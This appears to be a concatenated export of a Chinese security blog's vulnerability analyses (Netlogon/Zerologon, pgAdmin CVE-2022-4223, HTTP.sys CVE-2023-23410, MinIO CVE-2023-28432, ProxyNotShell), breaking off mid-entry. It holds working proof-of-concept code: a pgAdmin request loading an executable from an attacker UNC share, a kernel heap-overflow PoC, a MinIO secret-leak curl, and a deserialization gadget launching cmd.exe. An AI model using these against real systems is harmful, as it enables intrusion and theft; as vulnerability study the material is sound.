在PoC中循环发起认证，每次认证时，client challenge置为0x00 * 8，client credential置为0x00 * 8 在\rnetlogon协议中知道，服务器会比较自己计算的ClientCredential和客户端发过来的ClientCredential是否相等，而ClientCredential来源于会话密钥加密ClientChallenge。其中加密算法为AES，使用CFB8模式。该算法过程如下： 算法步骤：\n确定一个16字节的初始向量IV。 将IV和明文组合,例如IV + 明文的前16个字节。 对组合的数据块进行AES加密,输出一个16字节的密文块。 从密文块的第一个字节,与明文的第一个字节进行异或,得到密文的第一个字节。 密文的第一个字节与IV的第一个字节组合,形成一个新的16字节值。 对这个新的值再次进行AES加密,得到下一个16字节密文块。 从新密文块取第一个字节,与明文的下一个字节异或,生成密文的下一个字节。 重复步骤5-7,直到所有明文都被加密。 若明文不足16的倍数字节,剩余明文使用PKCS7Padding进行填充。 AES-CFB8通过前一个密文块的反馈来影响下一个明文块的加密,从而避免了ECB模式的确定性问题。但必须使用随机的IV来保证安全性。\n会话密钥计算公式：KDF(ClientChallenge+ServerChallenge+secret)，在每一轮认证过程中，ServerChallenge都会变化，但Windows中实现的AES-CFB8使用的iv被设为16字节的0x00 攻击者可控ClientChallenge和ClientCredential，CLientChallenge对应于蓝色部分。由于轮认证时ServerChallenge都会改变且不会重复，所以每次计算出的会话密钥都不一样。当ClientChallenge置为0x00 * 8，当第一轮计算时，计算出的结果有1/256概率为0x00，而这个0x00又会作为下一轮输入添加到iv的第一个字节，即有1/256概率计算后的结果和计算前的值一样全为0x00，这样每一轮计算结果都是全为0x00。 这样第一轮计算后在算法中的输入为全0，加密密钥不变，第二轮计算时，结果依然会是0，这样最终算法结果输出会是全0。 由于每轮认证过程中会话密钥都不一样，所以每一轮认证过程时，AES-CFB8第一轮计算的结果都会不一样，结果最多有256种情况，最差的情况在第256轮时计算结果为0x00。\n当AES-CFB8加密结果刚刚好为全0时，客户端发送的ClientCredential也为全0，此时就可以通过服务端的校验，完成身份验证。\n可以编写一段简单的python代码模拟服务端加密过程\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend import secrets iv = bytes([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ]) # 16 byte IV plaintext = bytes([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ]) # 8 byte plaintext for i in range(256): key = secrets.token_bytes(16) # 8 byte key cipher = Cipher(algorithms.AES(key), modes.CFB8(iv), backend=default_backend()) encryptor = cipher.encryptor() ciphertext = encryptor.update(plaintext) + encryptor.finalize() print(ciphertext.hex()) 在第115次时，加密后的密文为0x0000000000000000 参考链接\nhttps://xz.aliyun.com/t/8367 https://www.anquanke.com/post/id/219374#h3-6 https://www.secrss.com/articles/25580\nCreated at 2023-05-08T14:39:28+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/","title":"CVE-2022-4223 PgAdmin RCE 分析","tags":["漏洞分析"],"description":"","content":"基本信息 pgAdmin 服务器包含一个 HTTP API，用于验证用户选择的外部 PostgreSQL 实用程序（如 pg_dump 和 pg_restore）的路径。该实用程序由服务器执行，以确定它来自哪个PostgreSQL版本。6.17 之前的 pgAdmin 版本无法正确保护此 API，这可能允许未经身份验证的用户使用他们选择的路径调用它，例如他们在 Windows 计算机上控制的服务器的 UNC 路径。这将导致目标路径中正确命名的可执行文件由 pgAdmin 服务器执行。\n指纹 略\n影响版本 pgadmin \u0026lt; 6.17\n环境搭建 windows 10 postgresql13 技术分析\u0026amp;调试 复现 直接安装postgresql13，自带了pgadmin4，初始化环境后，使用python 启动pgadmin4，编译如下代码\n#include\u0026lt;stdlib\u0026gt; int main(){ system(\u0026#34;whoami \u0026gt; c:\\\\users\\\\public\\\\1.txt\u0026#34;); return 0; } 编译后命名为pg_dump.exe，将其放到某个目录内，并开启文件共享。 发送如下payload，在utility_path指向共享的文件夹路径，\nPOST /misc/validate_binary_path HTTP/1.1 Host: [TARGETHOST] Cookie: [COOKIES_YOU_FETCHED_IN_ADVANCE] X-pgA-CSRFToken: [CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE] Connection: close Referer: https://[TARGETHOST]/browser/ Content-Length: [n] Content-Type: application/json {\u0026#34;utility_path\u0026#34;:\u0026#34;\\\\\\\\[ATTACKER_IP]\\\\[PREFERED_SHARE_NAME]\u0026#34;} 分析 在 validate_binary_path路由对应的处理函数如下，这个函数接收POST请求，而后获取到body里面的 utility_path，这个函数接收 utility_path并使用 os.path.abspath(os.path.join拼接路径，而 os.path.join可以接受[[UNC路径]]，所以我们可以搭建一个SMB服务器并在上面有 pg_dump.exe，传入UNC路径，pgadmin就会获取到这个文件并执行，导致代码执行。\n@blueprint.route(\u0026#34;/validate_binary_path\u0026#34;, endpoint=\u0026#34;validate_binary_path\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) # [1] def validate_binary_path(): \u0026#34;\u0026#34;\u0026#34; This function is used to validate the specified utilities path by running the utilities with there versions. \u0026#34;\u0026#34;\u0026#34; data = None if hasattr(request.data, \u0026#39;decode\u0026#39;): data = request.data.decode(\u0026#39;utf-8\u0026#39;) if data != \u0026#39;\u0026#39;: data = json.loads(data) version_str = \u0026#39;\u0026#39; if \u0026#39;utility_path\u0026#39; in data and data[\u0026#39;utility_path\u0026#39;] is not None: # [2] # Check if \u0026#34;$DIR\u0026#34; present in binary path binary_path = replace_binary_path(data[\u0026#39;utility_path\u0026#39;]) # [3] for utility in UTILITIES_ARRAY: # [4] full_path = os.path.abspath( os.path.join(binary_path, (utility if os.name != \u0026#39;nt\u0026#39; else (utility + \u0026#39;.exe\u0026#39;)))) # [5] try: # Get the output of the \u0026#39;--version\u0026#39; command version_string = \\ subprocess.getoutput(\u0026#39;\u0026#34;{0}\u0026#34; --version\u0026#39;.format(full_path)) # [6] # Get the version number by splitting the result string version_string.split(\u0026#34;) \u0026#34;, 1)[1].split(\u0026#39;.\u0026#39;, 1)[0] ... 补丁 补丁中增加了身份验证，并且在拼接路径时使用os.path.exists检查是否存在，不存在则报错。\n小结 这个漏洞原理较为简单，python的函数可以接收UNC路径，而开发者并未考虑到这一点，导致可以传入UNC路径达成远程代码执行。值得注意的是这个漏洞是靠codeql审计出来的。\n参考链接\nhttps://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html\nCreated at 2023-05-08T14:18:21+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/","title":"CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。\n环境搭建 操作系统 windows 10 调试器 windbg 技术分析\u0026amp;调试 PoC\n#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include \u0026lt;http.h\u0026gt; #include \u0026lt;sspi.h\u0026gt; #include \u0026lt;strsafe.h\u0026gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // 初始化HTTP服务器驱动 retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpInitialize failed with %lu \\n\u0026#34;, retCode); return retCode; } // 创建服务会话 retCode = HttpCreateServerSession(HttpApiVersion, \u0026amp;ssID, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateServerSession failed with %lu \\n\u0026#34;, retCode); return 0; } // 创建url group retCode = HttpCreateUrlGroup(ssID, \u0026amp;urlGroupId, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateUrlGroup failed with %lu \\n\u0026#34;, retCode); return 0; } BYTE data_temp1[0x1000] = {0}; DWORD return_len = 0; // 分配 0xfffffe0 大小的堆块 WCHAR *str = HeapAlloc(GetProcessHeap(), 0, 0xfffffe0); WCHAR str_test[0xfffe] = L\u0026#34;192.168.52.133:8081\u0026#34;; memcpy(str, str_test, 0x20); HTTP_CHANNEL_BIND_INFO bind_info; bind_info.Hardening = HttpAuthenticationHardeningLegacy; bind_info.Flags = HTTP_CHANNEL_BIND_PROXY; HTTP_SERVICE_BINDING_W service_binding; HTTP_SERVICE_BINDING_BASE binding_base; binding_base.Type = HttpServiceBindingTypeW; service_binding.Base = binding_base; service_binding.Buffer = str; service_binding.BufferSize = 0xfffffe0 - 0xf0f0f0; // F0F0EF0 PHTTP_SERVICE_BINDING_BASE binding_base_arr[0x11]; PHTTP_SERVICE_BINDING_BASE tmp_binding_base = \u0026amp;service_binding; for (int i = 0; i \u0026lt; 0x11; i++) { binding_base_arr[i] = tmp_binding_base; } bind_info.ServiceNames = binding_base_arr; bind_info.NumberOfServiceNames = 0x11; retCode = HttpSetUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;bind_info, 0x20); retCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); } 在http!UlCopyChannelBindConfigToIrp 下断点，运行PoC，此时调用栈为\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff889`cd7f76a8 fffff805`7981ae19 HTTP!UlCopyChannelBindConfigToIrp 01 fffff889`cd7f76b0 fffff805`7982caf5 HTTP!UlQueryConfigGroupProperty+0x175 02 fffff889`cd7f7740 fffff805`797130aa HTTP!UlQueryUrlGroupIoctl+0x195 03 fffff889`cd7f77c0 fffff805`6dc954d5 HTTP!UxDeviceControl+0x8a 04 fffff889`cd7f7800 fffff805`6e0a6048 nt!IofCallDriver+0x55 05 fffff889`cd7f7840 fffff805`6e0a5e47 nt!IopSynchronousServiceTail+0x1a8 06 fffff889`cd7f78e0 fffff805`6e0a51c6 nt!IopXxxControlFile+0xc67 07 fffff889`cd7f7a20 fffff805`6de0d8f5 nt!NtDeviceIoControlFile+0x56 08 fffff889`cd7f7a90 00007ff9`c610d1a4 nt!KiSystemServiceCopyEnd+0x25 09 00000014`7dcd6308 00007ff9`b6391b7a ntdll!NtDeviceIoControlFile+0x14 0a 00000014`7dcd6310 00007ff9`b6393c9f HTTPAPI!HttpApiSynchronousDeviceControl+0x8a 0b 00000014`7dcd6390 00007ff6`93fb18b2 HTTPAPI!HttpQueryUrlGroupProperty+0x6f 0c 00000014`7dcd6410 00000000`00000000 http_poc2!wmain+0x3d2 [D:\\code\\c\\http_poc2.c @ 113] http!UlCopyChannelBindConfigToIrp 伪代码如下，该函数调用UxGetOutputBufferForOutDirect 计算存储ChannelBindConfig 所需的内存大小，并和UxGetOutputBufferForOutDirect返回的分配的内存大小作比较：\n__int64 __fastcall UlCopyChannelBindConfigToIrp(__int64 a1, IRP *a2, unsigned int *a3) { ... v8 = UlpComputeChannelBindConfigSize(a1, a2); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 16, 4, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } v11 = v31; if ( (*(_DWORD *)a1 \u0026amp; 1) == 0 ) { *(_QWORD *)v31 = 0i64; *(_QWORD *)(v11 + 8) = 0i64; goto LABEL_32; } *(_DWORD *)(v31 + 4) = *(_DWORD *)(a1 + 8); *(_DWORD *)v11 = *(_DWORD *)(a1 + 4); *(_QWORD *)(v11 + 8) = 0i64; v12 = *(_QWORD *)(a1 + 16); if ( !v12 || !*(_DWORD *)(v12 + 16) ) goto LABEL_32; v13 = (v11 + 19) \u0026amp; 0xFFFFFFFFFFFFFFFCui64; v38 = v13; v36 = (_DWORD *)v13; *(_DWORD *)(v11 + 8) = v13 + v32 - v31; *(_DWORD *)(v11 + 12) = *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); v14 = *(unsigned int *)(*(_QWORD *)(a1 + 16) + 16i64); v15 = (_DWORD *)(v13 + 4 * v14); v37 = v15; v16 = (char *)\u0026amp;v15[3 * v14]; v35 = v16; v17 = 0; v34 = 0; while ( v17 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_DWORD *)(v13 + 4i64 * v17) = (_DWORD)v15 + v32 - v31; v18 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v17); if ( *(_DWORD *)v18 == 2 ) { v36 = v15 + 3; v37 = v15 + 3; *v15 = 2; v15[1] = (_DWORD)v16 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v16, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v35[*(unsigned int *)(v18 + 16)]; } else { v36 = v15 + 3; v37 = v15 + 3; *v15 = 1; v30 = (char *)((unsigned __int64)(v16 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); v15[1] = (_DWORD)v30 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v30, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v30[*(unsigned int *)(v18 + 16)]; } v35 = v16; v34 = ++v17; v15 = v36; v13 = v38; } LABEL_31: v3 = v42; goto LABEL_32; } v38 = 0i64; v19 = IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 24, v19 != 0 ? 4 : 8, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) == 0 ) goto LABEL_32; v10 = 44i64; goto LABEL_6; } if ( v21 \u0026amp;\u0026amp; *(_DWORD *)(v21 + 16) ) { ... while ( v26 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_QWORD *)(v22 + 8i64 * v26) = v32 + (unsigned int)(v24 - v31); v27 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v26); if ( *(_DWORD *)v27 == 2 ) { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 2; *(_QWORD *)(v24 + 8) = v32 + (unsigned int)((_DWORD)v25 - v31); *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v25, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16)); v25 = \u0026amp;v35[*(unsigned int *)(v27 + 16)]; } else { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 1; v28 = (char *)((unsigned __int64)(v25 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); *(_QWORD *)(v24 + 8) = v32 + (((_DWORD)v25 + 1) \u0026amp; 0xFFFFFFFE) - (unsigned int)v31; *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v28, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16));// 触发漏洞 v25 = \u0026amp;v28[*(unsigned int *)(v27 + 16)]; } v35 = v25; v34 = ++v26; v24 = (__int64)v36; v22 = v39; } goto LABEL_31; } LABEL_32: if ( (int)(OutputBufferForOutDirect + 0x80000000) \u0026lt; 0 || OutputBufferForOutDirect == -2147483643 ) v6 = v8; *v3 = v6; return (unsigned int)OutputBufferForOutDirect; } 在UlpComputeChannelBindConfigSize函数中存在整数溢出，该函数伪代码如下，rsi+10h处指向了用户传入的HTTP_CHANNEL_BIND_INFO结构体，该结构体定义如下：\ntypedef struct _HTTP_CHANNEL_BIND_INFO { HTTP_AUTHENTICATION_HARDENING_LEVELS Hardening; ULONG Flags; PHTTP_SERVICE_BINDING_BASE * ServiceNames; ULONG NumberOfServiceNames; } HTTP_CHANNEL_BIND_INFO, *PHTTP_CHANNEL_BIND_INFO; typedef enum _HTTP_AUTHENTICATION_HARDENING_LEVELS { HttpAuthenticationHardeningLegacy = 0, HttpAuthenticationHardeningMedium, HttpAuthenticationHardeningStrict } HTTP_AUTHENTICATION_HARDENING_LEVELS; typedef struct _HTTP_SERVICE_BINDING_BASE { HTTP_SERVICE_BINDING_TYPE Type; } HTTP_SERVICE_BINDING_BASE, *PHTTP_SERVICE_BINDING_BASE; typedef struct _HTTP_SERVICE_BINDING_A { HTTP_SERVICE_BINDING_BASE Base; PCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_A, *PHTTP_SERVICE_BINDING_A; typedef struct _HTTP_SERVICE_BINDING_W { HTTP_SERVICE_BINDING_BASE Base; PWCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_W, *PHTTP_SERVICE_BINDING_W; __int64 __fastcall UlpComputeChannelBindConfigSize(__int64 a1, IRP *a2) { unsigned int v4; // ebx __int64 v5; // rax __int64 v6; // rdi __int64 v7; // r9 _DWORD *v8; // r8 v4 = IoIs32bitProcess(a2) != 0 ? 16 : 24; if ( (*(_DWORD *)a1 \u0026amp; 1) != 0 ) { v5 = *(_QWORD *)(a1 + 16); if ( v5 ) { if ( *(_DWORD *)(v5 + 16) ) { v6 = 0i64; v4 += (IoIs32bitProcess(a2) != 0 ? 16 : 32) * *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); if ( *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { do { IoIs32bitProcess(a2); v7 = *(_QWORD *)(a1 + 16); // HTTP_CHANNEL_BIND_INFO 结构体 v8 = *(_DWORD **)(*(_QWORD *)(v7 + 8) + 8 * v6);// ServiceName 结构体 if ( *v8 == 1 ) // 如果是HttpServiceBindingTypeW 则进入 v4 = (v4 + 1) \u0026amp; 0xFFFFFFFE; v4 += v8[4]; // V8是enum HTTP_SERVICE_BINDING_BASE类型，占4个字节，则V8[4]就是V8 后面16个字节，即BufferSize v6 = (unsigned int)(v6 + 1); } while ( (unsigned int)v6 \u0026lt; *(_DWORD *)(v7 + 16) ); } } } } return v4; } 该函数遍历HTTP_CHANNEL_BIND_INFO结构体的ServiceNames HTTP_SERVICE_BINDING_W指针数组的BufferSize，并相加，而后将其返回，其中v4为unsigned int类型，而BufferSize为ULONG类型，均为四个字节，当循环相加时，如果BufferSize * NumberOfServiceNames 和v4相加超出0xFFFFFFFF则会产生整数溢出，使得UlpComputeChannelBindConfigSize返回的内存大小小于实际所需的内存大小。在调试器中可以看到在执行完fffff805`7984c899 03d9 add ebx, ecx后，将产生溢出，ebx变为0x28。\n返回到上层函数，UlCopyChannelBindConfigToIrp 调用UxGetOutputBufferForOutDirect获取到用户传入的缓冲区大小，此时v41值为0x140\nretCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (__int64)a2, (__int64)CurrentStackLocation, 0x10u, 4i64, \u0026amp;v31, \u0026amp;v32, \u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } 由于在HTTP!UlpComputeChannelBindConfigSize中发生整数溢出，导致HTTP!UlpComputeChannelBindConfigSize返回值小于用户提供的0x140，绕过了内存大小检查，在后面通过memcpy将HTTP_CHANNEL_BIND_INFO结构体的PHTTP_SERVICE_BINDING_BASE的Buffer成员拷贝到指定内存中，拷贝长度为BufferSize，即用户提供的0xF0F0EF0\n0xF0F0EF0远大于用户输入的缓冲区0x1000，导致堆溢出。\n补丁 通过bindiff可知，在补丁中增加了对BufferSize进行判断的逻辑，判断BufferSize是否小于0xFFFC\n由于ServiceName最大数量限制为0x40，则0x40 * 0xFFFC = 3FFF00，不能产生溢出，修复了该漏洞。\n参考资料\nhttps://www.freebuf.com/vuls/364920.html\nCreated at 2023-05-05T20:59:45+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/","title":"CVE-2023-28432 MinIO 信息泄露漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Minio是一个多云对象存储框架。在从 RELEASE.2019-12-17T23-16-33Z 开始且 RELEASE.2023-03-20T20-16-18Z 之前的集群部署中，MinIO 返回所有环境变量，包括“MINIO_SECRET_KEY”和“MINIO_ROOT_PASSWORD”，从而导致信息泄露。分布式部署的所有用户都会受到影响。建议所有用户升级到发布版本.2023-03-20T20-16-18Z。\n指纹 web.title=\u0026ldquo;minio\u0026rdquo;\n影响版本 2019-12-17t23-16-33z \u0026lt;= Minio \u0026lt; 2023-03-20t20-16-18z\n环境搭建 使用Docker启动4个minio即可。\n技术分析\u0026amp;调试 补丁分析 对比修复版本和未修复版本 https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z\u0026hellip;RELEASE.2023-03-20T20-16-18Z可知漏洞在commit https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077修复，查看修复代码，可以知道在 cmd/bootstrap-peer-server.go#VerifyHandler方法中增加了鉴权逻辑： func storageServerRequestValidate(r *http.Request) error { token, err := jwtreq.AuthorizationHeaderExtractor.ExtractToken(r) if err != nil { if err == jwtreq.ErrNoTokenInRequest { return errNoAuthToken } return errMalformedAuth } claims := xjwt.NewStandardClaims() if err = xjwt.ParseWithStandardClaims(token, claims, []byte(globalActiveCred.SecretKey)); err != nil { return errAuthentication } owner := claims.AccessKey == globalActiveCred.AccessKey || claims.Subject == globalActiveCred.AccessKey if !owner { return errAuthentication } if claims.Audience != r.URL.RawQuery { return errAuthentication } requestTimeStr := r.Header.Get(\u0026#34;X-Minio-Time\u0026#34;) requestTime, err := time.Parse(time.RFC3339, requestTimeStr) if err != nil { return errMalformedAuth } utcNow := UTCNow() delta := requestTime.Sub(utcNow) if delta \u0026lt; 0 { delta *= -1 } if delta \u0026gt; DefaultSkewTime { return errSkewedAuthTime } return nil } 而 VerifyHandler方法对应的路由在cmd/bootstrap-peer-server.go#registerBootstrapRESTHandlers注册，对应的路径为 bootstrapRESTPrefix+bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify\nfunc registerBootstrapRESTHandlers(router *mux.Router) { h := func(f http.HandlerFunc) http.HandlerFunc { return collectInternodeStats(httpTraceHdrs(f)) } server := \u0026amp;bootstrapRESTServer{} subrouter := router.PathPrefix(bootstrapRESTPrefix).Subrouter() subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodHealth).HandlerFunc( h(server.HealthHandler)) subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify).HandlerFunc( h(server.VerifyHandler)) } minioReservedBucket = \u0026#34;minio\u0026#34; minioReservedBucketPath = SlashSeparator + minioReservedBucket bootstrapRESTPrefix = minioReservedBucketPath + \u0026#34;/bootstrap\u0026#34; const ( bootstrapRESTVersion = \u0026#34;v1\u0026#34; bootstrapRESTVersionPrefix = SlashSeparator + bootstrapRESTVersion ) const ( bootstrapRESTMethodVerify = \u0026#34;/verify\u0026#34; ) 综合可得，触发漏洞方法为向/minio/bootstrap/v1/verify接口发送POST请求即可，除了对verify接口做鉴权之外，补丁中还在输出中去除了密钥等敏感信息。 ![[../images/Pasted image 20231007234853.png]]\nPoC\ncurl -X POST http://target/minio/bootstrap/v1/verify 小结 这个漏洞分析起来较为简单，由于Minio是go开发的，直接RCE比较难，目前RCE方式是通过信息泄露获取到管理员密钥登录，而后替换更新链接，在使用minio自带的mc工具进行更新，将当前minio实例替换为带有后门版本的minio，从而执行任意代码。\n参考链接\nhttps://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z\u0026hellip;RELEASE.2023-03-20T20-16-18Z\n创建于2023-10-06\nCreated at 2023-05-05T20:53:41+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/","title":"Proxy Not Shell 利用链分析","tags":["漏洞分析"],"description":"","content":"漏洞环境 Windows Server 2019 Windows Exchange 2019 CU9 漏洞分析 漏洞链包含了两个漏洞：\nCVE-2022-41040 Exchange 权限提升漏洞 CVE-2022-41082 Exchange 远程代码执行漏洞 CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。\nCVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。\n在PoC中发送了以下三种类型的PSRP消息\n0x00010002 SESSION_CAPABILITY\nSESSION_CAPABILITY 应该是创建RunspacePool\n0x00010004 INIT_RUNSPACEPOOL\nINIT_RUNSPACEPOOL 应该是初始化RunspacePool\n0x00021006 CREATE_PIPELINE\n创建命令管道并在指定的 RunspacePool 中调用它\nPoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。\nPoC主要组成部分如下所示，BA标签内是base64编码的序列化System.UnitySerializationHolder对象\n\u0026lt;Obj N=\u0026#34;V\u0026#34; RefId=\u0026#34;14\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;Name\u0026#34;\u0026gt;Type\u0026lt;/S\u0026gt; \u0026lt;Obj N=\u0026#34;TargetTypeForDeserialization\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Exception\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;MS\u0026gt; \u0026lt;BA N=\u0026#34;SerializationData\u0026#34;\u0026gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=\u0026lt;/BA\u0026gt; \u0026lt;/MS\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;S\u0026gt; \u0026lt;![CDATA[\u0026lt;ResourceDictionary xmlns=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation\u0026#34; xmlns:x=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml\u0026#34; xmlns:System=\u0026#34;clr-namespace:System;assembly=mscorlib\u0026#34; xmlns:Diag=\u0026#34;clr-namespace:System.Diagnostics;assembly=system\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider x:Key=\u0026#34;LaunchCalch\u0026#34; ObjectType=\u0026#34;{x:Type Diag:Process}\u0026#34; MethodName=\u0026#34;Start\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider.MethodParameters\u0026gt;\u0026lt;System:String\u0026gt;cmd.exe\u0026lt;/System:String\u0026gt;\u0026lt;System:String\u0026gt;/c whoami\u0026gt; c:\\users\\public\\1.txt\u0026lt;/System:String\u0026gt; \u0026lt;/ObjectDataProvider.MethodParameters\u0026gt; \u0026lt;/ObjectDataProvider\u0026gt; \u0026lt;/ResourceDictionary\u0026gt;]]\u0026gt; \u0026lt;/S\u0026gt; \u0026lt;/Obj\u0026gt; XamlReader.Parse() BA标签数据 .....ÿÿÿÿ..............System.UnitySerializationHolder..... Data\tUnityType.AssemblyName......... System.Windows.Markup.XamlReader......... XPresentationFramework, 